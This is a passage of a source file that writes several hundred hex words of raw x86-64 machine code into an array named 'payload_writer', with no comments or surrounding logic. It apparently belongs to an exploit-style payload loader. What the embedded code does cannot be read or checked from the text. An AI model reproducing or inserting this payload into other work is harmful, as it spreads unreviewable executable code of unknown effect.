  payload_writer[571] = 0x83894820;
  payload_writer[572] = 0x00000460;
  payload_writer[573] = 0xd51d8948;
  payload_writer[574] = 0x48000056;
  payload_writer[575] = 0x04689889;
  payload_writer[576] = 0xc7480000;
  payload_writer[577] = 0x00046883;
  payload_writer[578] = 0x00000000;
  payload_writer[579] = 0x7083c700;
  payload_writer[580] = 0x00000004;
  payload_writer[581] = 0x48000000;
  payload_writer[582] = 0x56aa3d8d;
  payload_writer[583] = 0x05ff0000;
  payload_writer[584] = 0x000056b4;
  payload_writer[585] = 0x549e15ff;
  payload_writer[586] = 0x8d4c0000;
  payload_writer[587] = 0x8b502444;
  payload_writer[588] = 0x0056a315;
  payload_writer[589] = 0xc7894c00;
  payload_writer[590] = 0x3e358d48;
  payload_writer[591] = 0x4c000044;
  payload_writer[592] = 0x08244489;
  payload_writer[593] = 0x15ffc031;
  payload_writer[594] = 0x0000561c;
  payload_writer[595] = 0x24448b4c;
  payload_writer[596] = 0x7b8d4808;
  payload_writer[597] = 0xd9894808;
  payload_writer[598] = 0x9f158d48;
  payload_writer[599] = 0x31fffffc;
  payload_writer[600] = 0x7915fff6;
  payload_writer[601] = 0xff000054;
  payload_writer[602] = 0x00566b05;
  payload_writer[603] = 0xfec1e900;
  payload_writer[604] = 0x8148ffff;
  payload_writer[605] = 0x000098c4;
  payload_writer[606] = 0x5bc03100;
  payload_writer[607] = 0x415c415d;
  payload_writer[608] = 0x415e415d;
  payload_writer[609] = 0x5355c35f;
  payload_writer[610] = 0x18ec8348;
  payload_writer[611] = 0x01187f83;
  payload_writer[612] = 0x48fb8948;
  payload_writer[613] = 0x537e2d8b;
  payload_writer[614] = 0x8b480000;
  payload_writer[615] = 0x0055ff05;
  payload_writer[616] = 0xf7894800;
  payload_writer[617] = 0x24748948;
  payload_writer[618] = 0xff077508;
  payload_writer[619] = 0x147b8bd0;
  payload_writer[620] = 0xd0ff05eb;
  payload_writer[621] = 0x483c7b8b;
  payload_writer[622] = 0x0824748b;
  payload_writer[623] = 0x18c48348;
  payload_writer[624] = 0x5bc28948;
  payload_writer[625] = 0x5de88948;
  payload_writer[626] = 0xe0ffc931;
  payload_writer[627] = 0xfb894853;
  payload_writer[628] = 0x10ec8348;
  payload_writer[629] = 0x01187f83;
  payload_writer[630] = 0x75147f8b;
  payload_writer[631] = 0x738d4811;
  payload_writer[632] = 0x0010ba1c;
  payload_writer[633] = 0x15ff0000;
  payload_writer[634] = 0x0000535c;
  payload_writer[635] = 0x44c71aeb;
  payload_writer[636] = 0x00100c24;
  payload_writer[637] = 0x8d480000;
  payload_writer[638] = 0x480c2454;
  payload_writer[639] = 0xff2c738d;
  payload_writer[640] = 0x00537315;
  payload_writer[641] = 0x3c438900;
  payload_writer[642] = 0x10c48348;
  payload_writer[643] = 0x5541c35b;
  payload_writer[644] = 0x53555441;
  payload_writer[645] = 0x41fb8948;
  payload_writer[646] = 0x70bb8352;
  payload_writer[647] = 0x01000004;
  payload_writer[648] = 0xbaf78948;
  payload_writer[649] = 0x000001ff;
  payload_writer[650] = 0xe681f619;
  payload_writer[651] = 0x000003f8;
  payload_writer[652] = 0x020ac681;
  payload_writer[653] = 0xbee80000;
  payload_writer[654] = 0x85000030;
  payload_writer[655] = 0xf2880fc0;
  payload_writer[656] = 0x8b000000;
  payload_writer[657] = 0x0055a73d;
  payload_writer[658] = 0xc4894100;
  payload_writer[659] = 0x53d615ff;
  payload_writer[660] = 0x85480000;
  payload_writer[661] = 0xc58948c0;
  payload_writer[662] = 0x8d482875;
  payload_writer[663] = 0x0043333d;
  payload_writer[664] = 0x2d8b4800;
  payload_writer[665] = 0x000052b0;
  payload_writer[666] = 0x553215ff;
  payload_writer[667] = 0x7b8b0000;
  payload_writer[668] = 0x48c93110;
  payload_writer[669] = 0x8d48c289;
  payload_writer[670] = 0x00431735;
  payload_writer[671] = 0x00d6e900;
  payload_writer[672] = 0x89480000;
  payload_writer[673] = 0xff42e8df;
  payload_writer[674] = 0x8d48ffff;
  payload_writer[675] = 0x0043243d;
  payload_writer[676] = 0x2d8b4c00;
  payload_writer[677] = 0x00005280;
  payload_writer[678] = 0x550215ff;
  payload_writer[679] = 0x7b8b0000;
  payload_writer[680] = 0x48c93110;
  payload_writer[681] = 0x8d48c289;
  payload_writer[682] = 0x00430835;
  payload_writer[683] = 0xd5ff4100;
  payload_writer[684] = 0x01187b83;
  payload_writer[685] = 0x5536158b;
  payload_writer[686] = 0x8b480000;
  payload_writer[687] = 0x00527705;
  payload_writer[688] = 0x8b057500;
  payload_writer[689] = 0x03eb147b;
  payload_writer[690] = 0x313c7b8b;
  payload_writer[691] = 0xee8948c9;
  payload_writer[692] = 0xc085d0ff;
  payload_writer[693] = 0xc2890f74;
  payload_writer[694] = 0x44ee8948;
  payload_writer[695] = 0x0ae8e789;
  payload_writer[696] = 0xeb000030;
  payload_writer[697] = 0xe78944cb;
  payload_writer[698] = 0x003018e8;
  payload_writer[699] = 0xef894800;
  payload_writer[700] = 0x54ca15ff;
  payload_writer[701] = 0x83c70000;
  payload_writer[702] = 0x00000470;
  payload_writer[703] = 0x00000000;
  payload_writer[704] = 0x112d8b48;
  payload_writer[705] = 0x48000052;
  payload_writer[706] = 0x42cf3d8d;
  payload_writer[707] = 0x15ff0000;
  payload_writer[708] = 0x0000548c;
  payload_writer[709] = 0x31107b8b;
  payload_writer[710] = 0xc28948c9;
  payload_writer[711] = 0xba358d48;
  payload_writer[712] = 0xff000042;
  payload_writer[713] = 0x485941d5;
  payload_writer[714] = 0x5d5bdf89;
  payload_writer[715] = 0x5d415c41;
  payload_writer[716] = 0xfff820e9;
  payload_writer[717] = 0x3d8d48ff;
  payload_writer[718] = 0x000042bb;
  payload_writer[719] = 0xd52d8b48;
  payload_writer[720] = 0xff000051;
  payload_writer[721] = 0x00545715;
  payload_writer[722] = 0x107b8b00;
  payload_writer[723] = 0x8948c931;
  payload_writer[724] = 0x358d48c2;
  payload_writer[725] = 0x0000429f;
  payload_writer[726] = 0x89485841;
  payload_writer[727] = 0x415d5be8;
  payload_writer[728] = 0xff5d415c;
  payload_writer[729] = 0x315541e0;
  payload_writer[730] = 0x555441d2;
  payload_writer[731] = 0xfb894853;
  payload_writer[732] = 0x89485241;
  payload_writer[733] = 0xe8f631f7;
  payload_writer[734] = 0x00002f7d;
  payload_writer[735] = 0x880fc085;
  payload_writer[736] = 0x00000102;
  payload_writer[737] = 0x0470b38b;
  payload_writer[738] = 0xd2310000;
  payload_writer[739] = 0x8941c789;
  payload_writer[740] = 0x303be8c4;
  payload_writer[741] = 0x3d8b0000;
  payload_writer[742] = 0x00005454;
  payload_writer[743] = 0x528615ff;
  payload_writer[744] = 0x85480000;
  payload_writer[745] = 0xc58948c0;
  payload_writer[746] = 0x8d482875;
  payload_writer[747] = 0x0041e33d;
  payload_writer[748] = 0x2d8b4800;
  payload_writer[749] = 0x00005160;
  payload_writer[750] = 0x53e215ff;
  payload_writer[751] = 0x7b8b0000;
  payload_writer[752] = 0x48c93110;
  payload_writer[753] = 0x8d48c289;
  payload_writer[754] = 0x0041c735;
  payload_writer[755] = 0x00d7e900;
  payload_writer[756] = 0x89480000;
  payload_writer[757] = 0xfdf2e8df;
  payload_writer[758] = 0x8d48ffff;
  payload_writer[759] = 0x0041d43d;
  payload_writer[760] = 0x2d8b4c00;
  payload_writer[761] = 0x00005130;
  payload_writer[762] = 0x53b215ff;
  payload_writer[763] = 0x7b8b0000;
  payload_writer[764] = 0x48c93110;
  payload_writer[765] = 0x8d48c289;
  payload_writer[766] = 0x0041b835;
  payload_writer[767] = 0xd5ff4100;
  payload_writer[768] = 0x53ea158b;
  payload_writer[769] = 0x89480000;
  payload_writer[770] = 0xe78944ee;
  payload_writer[771] = 0x002ed0e8;
  payload_writer[772] = 0x74c08500;
  payload_writer[773] = 0x187b8321;
  payload_writer[774] = 0x4cc28901;
  payload_writer[775] = 0x50f6058b;
  payload_writer[776] = 0x05750000;
  payload_writer[777] = 0xeb147b8b;
  payload_writer[778] = 0x3c7b8b03;
  payload_writer[779] = 0x8948c931;
  payload_writer[780] = 0xd0ff41ee;
  payload_writer[781] = 0x8944caeb;
  payload_writer[782] = 0x2ec7e8e7;
  payload_writer[783] = 0x89480000;
  payload_writer[784] = 0x7915ffef;
  payload_writer[785] = 0xc7000053;
  payload_writer[786] = 0x00047083;
  payload_writer[787] = 0x00000000;
  payload_writer[788] = 0x2d8b4800;
  payload_writer[789] = 0x000050c0;
  payload_writer[790] = 0x7e3d8d48;
  payload_writer[791] = 0xff000041;
  payload_writer[792] = 0x00533b15;
  payload_writer[793] = 0x107b8b00;
  payload_writer[794] = 0x8948c931;
  payload_writer[795] = 0x358d48c2;
  payload_writer[796] = 0x00004169;
  payload_writer[797] = 0x5941d5ff;
  payload_writer[798] = 0x5bdf8948;
  payload_writer[799] = 0x415c415d;
  payload_writer[800] = 0xf6cfe95d;
  payload_writer[801] = 0x8d48ffff;
  payload_writer[802] = 0x00416a3d;
  payload_writer[803] = 0x2d8b4800;
  payload_writer[804] = 0x00005084;
  payload_writer[805] = 0x530615ff;
  payload_writer[806] = 0x7b8b0000;
  payload_writer[807] = 0x48c93110;
  payload_writer[808] = 0x8d48c289;
  payload_writer[809] = 0x00414e35;
  payload_writer[810] = 0x48584100;
  payload_writer[811] = 0x5d5be889;
  payload_writer[812] = 0x5d415c41;
  payload_writer[813] = 0x4853e0ff;
  payload_writer[814] = 0x15fffb89;
  payload_writer[815] = 0x000052e0;
  payload_writer[816] = 0x75c8ff48;
  payload_writer[817] = 0xdf894811;
  payload_writer[818] = 0x358d485b;
  payload_writer[819] = 0x000040ab;
  payload_writer[820] = 0x511a25ff;
  payload_writer[821] = 0x2fbe0000;
  payload_writer[822] = 0x48000000;
  payload_writer[823] = 0x15ffdf89;
  payload_writer[824] = 0x00005164;
  payload_writer[825] = 0x74c33948;
  payload_writer[826] = 0x0000c6dc;
  payload_writer[827] = 0x5355c35b;
  payload_writer[828] = 0x50fb8948;
  payload_writer[829] = 0x60bf8d48;
  payload_writer[830] = 0xe8000002;
  payload_writer[831] = 0xffffffb6;
  payload_writer[832] = 0x112d8b48;
  payload_writer[833] = 0x48000050;
  payload_writer[834] = 0x40ff3d8d;
  payload_writer[835] = 0x15ff0000;
  payload_writer[836] = 0x0000528c;
  payload_writer[837] = 0x31107b8b;
  payload_writer[838] = 0x485841c9;
  payload_writer[839] = 0x485bc289;
  payload_writer[840] = 0x485de889;
  payload_writer[841] = 0x40e3358d;
  payload_writer[842] = 0xe0ff0000;
  payload_writer[843] = 0x53555441;
  payload_writer[844] = 0x48fb8948;
  payload_writer[845] = 0x0210ec81;
  payload_writer[846] = 0x8b480000;
  payload_writer[847] = 0x000258bf;
  payload_writer[848] = 0xff854800;
  payload_writer[849] = 0x8d482875;
  payload_writer[850] = 0x003ecb3d;
  payload_writer[851] = 0x2d8b4800;
  payload_writer[852] = 0x00004fc4;
  payload_writer[853] = 0x524615ff;
  payload_writer[854] = 0x7b8b0000;
  payload_writer[855] = 0x48c93110;
  payload_writer[856] = 0x8d48c289;
  payload_writer[857] = 0x003eaf35;
  payload_writer[858] = 0x0157e900;
  payload_writer[859] = 0x8d480000;
  payload_writer[860] = 0x3112246c;
  payload_writer[861] = 0xea8948c0;
  payload_writer[862] = 0xa2358d48;
  payload_writer[863] = 0xff000040;
  payload_writer[864] = 0x00515315;
  payload_writer[865] = 0x7ec08500;
  payload_writer[866] = 0x358d48bd;
  payload_writer[867] = 0x00003feb;
  payload_writer[868] = 0xffef8948;
  payload_writer[869] = 0x0051b715;
  payload_writer[870] = 0x75c08500;
  payload_writer[871] = 0xbb8d480f;
  payload_writer[872] = 0x00000260;
  payload_writer[873] = 0xe9ee8948;
  payload_writer[874] = 0x000000f0;
  payload_writer[875] = 0x76358d48;
  payload_writer[876] = 0x48000040;
  payload_writer[877] = 0x15ffef89;
  payload_writer[878] = 0x00005194;
  payload_writer[879] = 0x1175c085;
  payload_writer[880] = 0x60bb8d48;
  payload_writer[881] = 0xe8000002;
  payload_writer[882] = 0xfffffeea;
  payload_writer[883] = 0x0000d1e9;
  payload_writer[884] = 0x247c8000;
  payload_writer[885] = 0x8d4c2f12;
  payload_writer[886] = 0x011124a4;
  payload_writer[887] = 0x0e750000;
  payload_writer[888] = 0x4cee8948;
  payload_writer[889] = 0x15ffe789;
  payload_writer[890] = 0x00005004;
  payload_writer[891] = 0x8d4854eb;
  payload_writer[892] = 0x0002608b;
  payload_writer[893] = 0x358d4800;
  payload_writer[894] = 0x00003f7f;
  payload_writer[895] = 0x48cf8948;
  payload_writer[896] = 0x08244c89;
  payload_writer[897] = 0x514615ff;
  payload_writer[898] = 0x89490000;
  payload_writer[899] = 0x0d8b4ce8;
  payload_writer[900] = 0x00004ff4;
  payload_writer[901] = 0x8b48c085;
  payload_writer[902] = 0x7508244c;
  payload_writer[903] = 0x158d4811;
  payload_writer[904] = 0x00004008;
  payload_writer[905] = 0x0000ffbe;
  payload_writer[906] = 0xe7894c00;
  payload_writer[907] = 0x8d4811eb;
  payload_writer[908] = 0x003ffc15;
  payload_writer[909] = 0x00ffbe00;
  payload_writer[910] = 0x894c0000;
  payload_writer[911] = 0x41c031e7;
  payload_writer[912] = 0x8d48d1ff;
  payload_writer[913] = 0x003f3235;
  payload_writer[914] = 0xe7894c00;
  payload_writer[915] = 0x50fe15ff;
  payload_writer[916] = 0xc0850000;
  payload_writer[917] = 0xd2313c74;
  payload_writer[918] = 0x894cf631;
  payload_writer[919] = 0x2c97e8e7;
  payload_writer[920] = 0xc0850000;
  payload_writer[921] = 0x8d482579;
  payload_writer[922] = 0x003fca3d;
  payload_writer[923] = 0x2d8b4800;
  payload_writer[924] = 0x00004ea4;
  payload_writer[925] = 0x512615ff;
  payload_writer[926] = 0x7b8b0000;
  payload_writer[927] = 0x48c93110;
  payload_writer[928] = 0x8d48c289;
  payload_writer[929] = 0x003fae35;
  payload_writer[930] = 0x893aeb00;
  payload_writer[931] = 0x2c73e8c7;
  payload_writer[932] = 0x8d480000;
  payload_writer[933] = 0x000260bb;
  payload_writer[934] = 0xe6894c00;
  payload_writer[935] = 0x4f4e15ff;
  payload_writer[936] = 0x8d480000;
  payload_writer[937] = 0x003fa73d;
  payload_writer[938] = 0x2d8b4800;
  payload_writer[939] = 0x00004e68;
  payload_writer[940] = 0x50ea15ff;
  payload_writer[941] = 0x7b8b0000;
  payload_writer[942] = 0x48c93110;
  payload_writer[943] = 0x8d48c289;
  payload_writer[944] = 0x003f8b35;
  payload_writer[945] = 0x48d5ff00;
  payload_writer[946] = 0x0210c481;
  payload_writer[947] = 0x5d5b0000;
  payload_writer[948] = 0x41c35c41;
  payload_writer[949] = 0x48535554;
  payload_writer[950] = 0x8148fb89;
  payload_writer[951] = 0x000110ec;
  payload_writer[952] = 0xbf8b4800;
  payload_writer[953] = 0x00000258;
  payload_writer[954] = 0x75ff8548;
  payload_writer[955] = 0x2d8b4827;
  payload_writer[956] = 0x00004e24;
  payload_writer[957] = 0x1d3d8d48;
  payload_writer[958] = 0xff00003d;
  payload_writer[959] = 0x00509f15;
  payload_writer[960] = 0x107b8b00;
  payload_writer[961] = 0x8948c931;
  payload_writer[962] = 0x358d48c2;
  payload_writer[963] = 0x00003d08;
  payload_writer[964] = 0x5febd5ff;
  payload_writer[965] = 0x24448d4c;
  payload_writer[966] = 0x48c03111;
  payload_writer[967] = 0x8949f589;
  payload_writer[968] = 0x44894cd4;
  payload_writer[969] = 0x894c0824;
  payload_writer[970] = 0x358d48c2;
  payload_writer[971] = 0x00003ef1;
  payload_writer[972] = 0x4fa215ff;
  payload_writer[973] = 0xc0850000;
  payload_writer[974] = 0x7c80b37e;
  payload_writer[975] = 0x4c2f1124;
  payload_writer[976] = 0x0824448b;
  payload_writer[977] = 0x894c1175;
  payload_writer[978] = 0xc6894ce2;
  payload_writer[979] = 0xffef8948;
  payload_writer[980] = 0x004f6315;
  payload_writer[981] = 0x481ceb00;
  payload_writer[982] = 0x02608b8d;
  payload_writer[983] = 0x8d480000;
  payload_writer[984] = 0x003ecc15;
  payload_writer[985] = 0xe6894c00;
  payload_writer[986] = 0x31ef8948;
  payload_writer[987] = 0x9515ffc0;
  payload_writer[988] = 0x4800004e;
  payload_writer[989] = 0x0110c481;
  payload_writer[990] = 0x5d5b0000;
  payload_writer[991] = 0x55c35c41;
  payload_writer[992] = 0xec814853;
  payload_writer[993] = 0x00000108;
  payload_writer[994] = 0x047087c7;
  payload_writer[995] = 0xffff0000;
  payload_writer[996] = 0x8d48ffff;
  payload_writer[997] = 0x4801246c;
  payload_writer[998] = 0x8948fb89;
  payload_writer[999] = 0x00ffbaee;
  payload_writer[1000] = 0x2ce80000;
  payload_writer[1001] = 0x48ffffff;
  payload_writer[1002] = 0x8948ee89;
  payload_writer[1003] = 0xfa5ce8df;
  payload_writer[1004] = 0x8148ffff;
  payload_writer[1005] = 0x000108c4;
  payload_writer[1006] = 0xc35d5b00;
  payload_writer[1007] = 0x81485355;
  payload_writer[1008] = 0x000108ec;
  payload_writer[1009] = 0xfb894800;
  payload_writer[1010] = 0x246c8d48;
  payload_writer[1011] = 0x00ffba01;
  payload_writer[1012] = 0x89480000;
  payload_writer[1013] = 0xfef9e8ee;
  payload_writer[1014] = 0x8948ffff;
  payload_writer[1015] = 0xdf8948ee;
  payload_writer[1016] = 0xfffa29e8;
  payload_writer[1017] = 0xc48148ff;
  payload_writer[1018] = 0x00000108;
  payload_writer[1019] = 0x55c35d5b;
  payload_writer[1020] = 0xec814853;
  payload_writer[1021] = 0x00000108;
  payload_writer[1022] = 0x48fb8948;
  payload_writer[1023] = 0x01246c8d;
  payload_writer[1024] = 0x0000ffba;
  payload_writer[1025] = 0xee894800;
  payload_writer[1026] = 0xfffec6e8;
  payload_writer[1027] = 0xbb8d48ff;
  payload_writer[1028] = 0x0000035f;
  payload_writer[1029] = 0xe8ee8948;
  payload_writer[1030] = 0x00002b61;
  payload_writer[1031] = 0x2579c085;
  payload_writer[1032] = 0x563d8d48;
  payload_writer[1033] = 0x4800003e;
  payload_writer[1034] = 0x4cea2d8b;
  payload_writer[1035] = 0x15ff0000;
  payload_writer[1036] = 0x00004f6c;
  payload_writer[1037] = 0x31107b8b;
  payload_writer[1038] = 0xc28948c9;
  payload_writer[1039] = 0x3a358d48;
  payload_writer[1040] = 0xff00003e;
  payload_writer[1041] = 0x2d8b48d5;
  payload_writer[1042] = 0x00004ccc;
  payload_writer[1043] = 0x493d8d48;
  payload_writer[1044] = 0xff00003e;
  payload_writer[1045] = 0x004f4715;
  payload_writer[1046] = 0x107b8b00;
  payload_writer[1047] = 0x8948c931;
  payload_writer[1048] = 0x358d48c2;
  payload_writer[1049] = 0x00003e34;
  payload_writer[1050] = 0x8148d5ff;
  payload_writer[1051] = 0x000108c4;
  payload_writer[1052] = 0xc35d5b00;
  payload_writer[1053] = 0x81485355;
  payload_writer[1054] = 0x000108ec;
  payload_writer[1055] = 0xfb894800;
  payload_writer[1056] = 0x246c8d48;
  payload_writer[1057] = 0x00ffba01;
  payload_writer[1058] = 0x89480000;
  payload_writer[1059] = 0xfe41e8ee;
  payload_writer[1060] = 0x8948ffff;
  payload_writer[1061] = 0xdf8948ee;
  payload_writer[1062] = 0xfffac8e8;
  payload_writer[1063] = 0xc48148ff;
  payload_writer[1064] = 0x00000108;
  payload_writer[1065] = 0x55c35d5b;
  payload_writer[1066] = 0xec814853;
  payload_writer[1067] = 0x00000108;
  payload_writer[1068] = 0x0000ffba;
  payload_writer[1069] = 0x6c8d4800;
  payload_writer[1070] = 0x89480124;
  payload_writer[1071] = 0xee8948fb;
  payload_writer[1072] = 0xfffe0ee8;
  payload_writer[1073] = 0xef8948ff;
  payload_writer[1074] = 0x002a44e8;
  payload_writer[1075] = 0x2d8b4800;
  payload_writer[1076] = 0x00004c44;
  payload_writer[1077] = 0x8b48c085;
  payload_writer[1078] = 0x004ec305;
  payload_writer[1079] = 0x481a7800;
  payload_writer[1080] = 0x3dce3d8d;
  payload_writer[1081] = 0xd0ff0000;
  payload_writer[1082] = 0x31107b8b;
  payload_writer[1083] = 0xc28948c9;
  payload_writer[1084] = 0xbd358d48;
  payload_writer[1085] = 0xeb00003d;
  payload_writer[1086] = 0x3d8d4818;
  payload_writer[1087] = 0x00003dc8;
  payload_writer[1088] = 0x7b8bd0ff;
  payload_writer[1089] = 0x48c93110;
  payload_writer[1090] = 0x8d48c289;
  payload_writer[1091] = 0x003db735;
  payload_writer[1092] = 0x48d5ff00;
  payload_writer[1093] = 0x0108c481;
  payload_writer[1094] = 0x5d5b0000;
  payload_writer[1095] = 0x555441c3;
  payload_writer[1096] = 0x00ffba53;
  payload_writer[1097] = 0x81480000;
  payload_writer[1098] = 0x0001c0ec;
  payload_writer[1099] = 0xfd894800;
  payload_writer[1100] = 0x249c8d48;
  payload_writer[1101] = 0x000000c1;
  payload_writer[1102] = 0xe8de8948;
  payload_writer[1103] = 0xfffffd93;
  payload_writer[1104] = 0x24748d48;
  payload_writer[1105] = 0xdf894848;
  payload_writer[1106] = 0x002a54e8;
  payload_writer[1107] = 0x79c08500;
  payload_writer[1108] = 0x1d8b4827;
  payload_writer[1109] = 0x00004bc0;
  payload_writer[1110] = 0x8a3d8d48;
  payload_writer[1111] = 0xff00003d;
  payload_writer[1112] = 0x004e3b15;
  payload_writer[1113] = 0x107d8b00;
  payload_writer[1114] = 0x8948c931;
  payload_writer[1115] = 0x358d48c2;
  payload_writer[1116] = 0x00003d75;
  payload_writer[1117] = 0x3debd3ff;
  payload_writer[1118] = 0x245c8d48;
  payload_writer[1119] = 0x948b4808;
  payload_writer[1120] = 0x00009024;
  payload_writer[1121] = 0x358d4800;
  payload_writer[1122] = 0x00003d7b;
  payload_writer[1123] = 0x31df8948;
  payload_writer[1124] = 0xd115ffc0;
  payload_writer[1125] = 0x4800004d;
  payload_writer[1126] = 0x8b4cdf89;
  payload_writer[1127] = 0x004b7725;
  payload_writer[1128] = 0xf915ff00;
  payload_writer[1129] = 0x8b00004d;
  payload_writer[1130] = 0xc931107d;
  payload_writer[1131] = 0x48c28948;
  payload_writer[1132] = 0xff41de89;
  payload_writer[1133] = 0xc48148d4;
  payload_writer[1134] = 0x000001c0;
  payload_writer[1135] = 0x5c415d5b;
  payload_writer[1136] = 0x485355c3;
  payload_writer[1137] = 0x0108ec81;
  payload_writer[1138] = 0xffba0000;
  payload_writer[1139] = 0x48000000;
  payload_writer[1140] = 0x01246c8d;
  payload_writer[1141] = 0x48fb8948;
  payload_writer[1142] = 0xf4e8ee89;
  payload_writer[1143] = 0x48fffffc;
  payload_writer[1144] = 0xffbeef89;
  payload_writer[1145] = 0xe8000001;
  payload_writer[1146] = 0x0000299d;
  payload_writer[1147] = 0x252d8b48;
  payload_writer[1148] = 0x8500004b;
  payload_writer[1149] = 0x058b48c0;
  payload_writer[1150] = 0x00004da4;
  payload_writer[1151] = 0x8d481a78;
  payload_writer[1152] = 0x003d0d3d;
  payload_writer[1153] = 0x8bd0ff00;
  payload_writer[1154] = 0xc931107b;
  payload_writer[1155] = 0x48c28948;
  payload_writer[1156] = 0x3cfc358d;
  payload_writer[1157] = 0x18eb0000;
  payload_writer[1158] = 0x0c3d8d48;
  payload_writer[1159] = 0xff00003d;
  payload_writer[1160] = 0x107b8bd0;
  payload_writer[1161] = 0x8948c931;
  payload_writer[1162] = 0x358d48c2;
  payload_writer[1163] = 0x00003cfb;
  payload_writer[1164] = 0x8148d5ff;
  payload_writer[1165] = 0x000108c4;
  payload_writer[1166] = 0xc35d5b00;
  payload_writer[1167] = 0x81485355;
  payload_writer[1168] = 0x000108ec;
  payload_writer[1169] = 0x00ffba00;
  payload_writer[1170] = 0x8d480000;
  payload_writer[1171] = 0x4801246c;
  payload_writer[1172] = 0x8948fb89;
  payload_writer[1173] = 0xfc79e8ee;
  payload_writer[1174] = 0x8948ffff;
  payload_writer[1175] = 0x2933e8ef;
  payload_writer[1176] = 0xc0850000;
  payload_writer[1177] = 0x8d482578;
  payload_writer[1178] = 0x003ce43d;
  payload_writer[1179] = 0x2d8b4800;
  payload_writer[1180] = 0x00004aa4;
  payload_writer[1181] = 0x4d2615ff;
  payload_writer[1182] = 0x7b8b0000;
  payload_writer[1183] = 0x48c93110;
  payload_writer[1184] = 0x8d48c289;
  payload_writer[1185] = 0x003cc835;
  payload_writer[1186] = 0x314deb00;
  payload_writer[1187] = 0x6d15ffc0;
  payload_writer[1188] = 0x48000049;
  payload_writer[1189] = 0x4a7e2d8b;
  payload_writer[1190] = 0x38830000;
  payload_writer[1191] = 0x058b4842;
  payload_writer[1192] = 0x00004cfc;
  payload_writer[1193] = 0x8d481a75;
  payload_writer[1194] = 0x003cbd3d;
  payload_writer[1195] = 0x8bd0ff00;
  payload_writer[1196] = 0xc931107b;
  payload_writer[1197] = 0x48c28948;
  payload_writer[1198] = 0x3cac358d;
  payload_writer[1199] = 0x18eb0000;
  payload_writer[1200] = 0xc13d8d48;
  payload_writer[1201] = 0xff00003c;
  payload_writer[1202] = 0x107b8bd0;
  payload_writer[1203] = 0x8948c931;
  payload_writer[1204] = 0x358d48c2;
  payload_writer[1205] = 0x00003cb0;
  payload_writer[1206] = 0x8148d5ff;
  payload_writer[1207] = 0x000108c4;
  payload_writer[1208] = 0xc35d5b00;
  payload_writer[1209] = 0x56415741;
  payload_writer[1210] = 0x54415541;
  payload_writer[1211] = 0x81485355;
  payload_writer[1212] = 0x000548ec;
  payload_writer[1213] = 0xfd894800;
  payload_writer[1214] = 0x24748948;
  payload_writer[1215] = 0x9c8d4818;
  payload_writer[1216] = 0x0000c824;
  payload_writer[1217] = 0x7c8b4800;
  payload_writer[1218] = 0x89481824;
  payload_writer[1219] = 0x288fe8de;
  payload_writer[1220] = 0xc0850000;
  payload_writer[1221] = 0x848b2178;
  payload_writer[1222] = 0x00012024;
  payload_writer[1223] = 0x48d23100;
  payload_writer[1224] = 0x18247c8b;
  payload_writer[1225] = 0x4489f631;
  payload_writer[1226] = 0xcae82c24;
  payload_writer[1227] = 0x85000027;
  payload_writer[1228] = 0x244489c0;
  payload_writer[1229] = 0x48287928;
  payload_writer[1230] = 0x3af93d8d;
  payload_writer[1231] = 0x8b480000;
  payload_writer[1232] = 0x0049d31d;
  payload_writer[1233] = 0x5515ff00;
  payload_writer[1234] = 0x8b00004c;
  payload_writer[1235] = 0xc931107d;
  payload_writer[1236] = 0x48c28948;
  payload_writer[1237] = 0x3add358d;
  payload_writer[1238] = 0x6ce90000;
  payload_writer[1239] = 0x8b000005;
  payload_writer[1240] = 0x482c2444;
  payload_writer[1241] = 0x8948c789;
  payload_writer[1242] = 0xff102444;
  payload_writer[1243] = 0x004ab715;
  payload_writer[1244] = 0x548b4800;
  payload_writer[1245] = 0xf6311024;
  payload_writer[1246] = 0x48c78948;
  payload_writer[1247] = 0xff240489;
  payload_writer[1248] = 0x004b9b15;
  payload_writer[1249] = 0x258b4c00;
  payload_writer[1250] = 0x0000498c;
  payload_writer[1251] = 0x1b3d8d48;
  payload_writer[1252] = 0xff00003c;
  payload_writer[1253] = 0x004c0715;
  payload_writer[1254] = 0x107d8b00;
  payload_writer[1255] = 0x8948c931;
  payload_writer[1256] = 0x358d48c2;
  payload_writer[1257] = 0x00003c06;
  payload_writer[1258] = 0x48d4ff41;
  payload_writer[1259] = 0x8d4cef89;
  payload_writer[1260] = 0xe8782464;
  payload_writer[1261] = 0xfffff614;
  payload_writer[1262] = 0xffe7894c;
  payload_writer[1263] = 0x004b7f15;
  payload_writer[1264] = 0xb48d4800;
  payload_writer[1265] = 0x0000a424;
  payload_writer[1266] = 0xe7894c00;
  payload_writer[1267] = 0x4b8615ff;
  payload_writer[1268] = 0x8d480000;
  payload_writer[1269] = 0x01422484;
  payload_writer[1270] = 0x89480000;
  payload_writer[1271] = 0x4848245c;
  payload_writer[1272] = 0x20244489;
  payload_writer[1273] = 0x24848d48;
  payload_writer[1274] = 0x00000080;
  payload_writer[1275] = 0x24448948;
  payload_writer[1276] = 0x448d4860;
  payload_writer[1277] = 0x89487224;
  payload_writer[1278] = 0x8b082444;
  payload_writer[1279] = 0x482c2454;
  payload_writer[1280] = 0x8b24348b;
  payload_writer[1281] = 0xe828247c;
  payload_writer[1282] = 0x000027b9;
  payload_writer[1283] = 0x8e0fc085;
  payload_writer[1284] = 0x00000479;
  payload_writer[1285] = 0x03489848;
  payload_writer[1286] = 0x8b4c2404;
  payload_writer[1287] = 0x89482424;
  payload_writer[1288] = 0x4c502444;
  payload_writer[1289] = 0x5024643b;
  payload_writer[1290] = 0x0449840f;
  payload_writer[1291] = 0x80410000;
  payload_writer[1292] = 0x0008247c;
  payload_writer[1293] = 0x042f840f;
  payload_writer[1294] = 0x8d490000;
  payload_writer[1295] = 0x48082444;
  payload_writer[1296] = 0x18244c8b;
  payload_writer[1297] = 0x247c8b48;
  payload_writer[1298] = 0xc0894920;
  payload_writer[1299] = 0x24448948;
  payload_writer[1300] = 0x158d4830;
  payload_writer[1301] = 0x000039d9;
  payload_writer[1302] = 0x0000ffbe;
  payload_writer[1303] = 0xffc03100;
  payload_writer[1304] = 0x0049a315;
  payload_writer[1305] = 0x748b4800;
  payload_writer[1306] = 0x8b484824;
  payload_writer[1307] = 0xe820247c;
  payload_writer[1308] = 0x0000272d;
  payload_writer[1309] = 0x850fc085;
  payload_writer[1310] = 0x000003ed;
  payload_writer[1311] = 0xd024848b;
  payload_writer[1312] = 0x66000000;
  payload_writer[1313] = 0x66f00025;
  payload_writer[1314] = 0x75a0003d;
  payload_writer[1315] = 0x7c8b482f;
  payload_writer[1316] = 0x8d482024;
  payload_writer[1317] = 0x024124b4;
